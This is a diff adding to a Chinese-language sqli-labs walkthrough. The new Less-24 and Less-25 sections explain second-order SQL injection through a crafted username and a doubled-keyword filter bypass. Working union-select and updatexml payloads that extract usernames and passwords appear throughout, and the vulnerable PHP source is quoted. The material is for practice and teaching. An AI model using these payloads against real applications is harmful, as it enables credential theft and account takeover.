@@ -485,7 +485,7 @@ POST传参`uname=admin'&passwd=asdf`
 ```php
 @$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
 $result=mysqli_query($con, $sql);
-$row = mysqli_fetch_array($result, MYSQLI_BOTH);
+$row=mysqli_fetch_array($result, MYSQLI_BOTH);
 ```
 
 POST传参`1' or 1=1;#`
@@ -797,8 +797,6 @@ INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (''
 
 ### Less-19
 
-需要对源码进行修改,参照Less-17
-
 登录回显发现referer
 
 在header中设置`Referer: '`回显`You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '192.168.8.1')' at line 1`
@@ -865,8 +863,6 @@ Your ID:8
 
 ### Less-22
 
-需要对源码进行修改,参照Less-17
-
 与Less-21类似,把闭合方式换成`"`
 
 ## Advanced Injections
@@ -886,4 +882,97 @@ Your ID:8
 查用户名`?id=-1' union select 1,(select group_concat(username) from users),'1`,查密码同理
 
 也可以用报错注入`?id=1' or updatexml(1,concat(0x7e,(select substr(group_concat(schema_name),1,20) from information_schema.schemata),0x7e),1) or '1'='1`
+
+### Less-24
+
+>题目提示存在二次注入
+
+注册用户名`test`,密码`test`,登录进入后发现存在密码修改选项,结合题目提示,猜测其应该是通过构造特殊的用户名达成二次注入,从而在密码修改处修改其他用户的密码
+
+推测修改密码处的sql语句为`update users set password='$password' where username='$username'...`
+
+假设注册一个新的用户名为`test#'`,其在修改密码时构成了sql语句`update users set password='xxx' where username='test'#'...`
+
+从而成功修改用户`test`的密码
+
+- 猜测验证
+
+1. 注册用户`test`
+
+![](屏幕截图%202021-10-29%20141913.png)
+
+2. 注册用户`test#'`
+
+![](屏幕截图%202021-10-29%20142059.png)
+
+3. 对用户`test#'`的密码进行修改
+
+![](屏幕截图%202021-10-29%20142205.png)
+
+![](屏幕截图%202021-10-29%20142249.png)
+
+- 源码分析
+
+在`login_create.php`中
+
+```php
+$username=mysql_escape_string($_POST['username']) ;
+$pass=mysql_escape_string($_POST['password']);
+$re_pass=mysql_escape_string($_POST['re_password']);
+$sql = "insert into users ( username, password) values(\"$username\", \"$pass\")";
+```
+
+在`login.php`中
+
+```php
+function sqllogin(){
+    $username = mysql_real_escape_string($_POST["login_user"]);
+    $password = mysql_real_escape_string($_POST["login_password"]);
+    $sql = "SELECT * FROM users WHERE username='$username' and password='$password'";
+    $res = mysql_query($sql) or die('You tried to be real smart, Try harder!!!! :( ');
+    $row = mysql_fetch_row($res);
+    if ($row[1]) {
+		return $row[1];
+    } else {
+    	return 0;
+    }
+}
+$login = sqllogin();
+if (!$login== 0) 
+{
+	$_SESSION["username"] = $login;
+	setcookie("Auth", 1, time()+3600);
+	header('Location: logged-in.php');
+} 
+```
+
+在`pass_change.php`中
+
+```php
+$username=$_SESSION["username"];
+$curr_pass=mysql_real_escape_string($_POST['current_password']);
+$pass=mysql_real_escape_string($_POST['password']);
+$re_pass=mysql_real_escape_string($_POST['re_password']);
+$sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";
+```
+
+可以得知`$_SESSION["username"]`来源于数据库的查询结果,并没有经过转义处理,因此通过构造特殊的用户名即可达成二次注入
+
+### Less-25
+
+>`and`和`or`被过滤
+
+传入`?id=-1' union select 1,2,'3`成功闭合
+
+传入`?id=-1' union select 1,(select group_concat(username) from users),'3`得到用户名
+
+但是`password`中存在`or`被过滤
+
+传入`?id=-1' union select 1,(select group_concat(password) from users),'3`,返回`-1' union select 1,(select group_concat(passwd) from users),'3`
+
+推测存在关键词替换进而推测可能存在双写绕过
+
+传入`?id=-1' oorr 1=1--%20`正常回显,返回结果为`-1' or 1=1--`,说明存在双写绕过
+
+传入`?id=-1' union select 1,(select group_concat(passwoorrd) from users),'3`得到密码
 
